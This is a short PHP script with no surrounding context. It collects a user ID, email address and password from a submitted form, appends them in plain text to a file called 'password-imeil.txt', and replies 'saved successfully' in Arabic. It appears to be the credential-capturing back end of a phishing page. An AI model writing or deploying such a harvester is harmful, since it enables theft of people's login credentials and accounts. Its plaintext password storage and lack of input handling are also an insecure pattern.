<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $uid = $_POST['uid'] ?? '';
    $password = $_POST['password'] ?? '';
    $email = $_POST['email'] ?? '';

    $entry = "ID: $uid | Email: $email | Password: $password\n";
    file_put_contents("password-imeil.txt", $entry, FILE_APPEND);
    echo "تم الحفظ بنجاح";
}
?>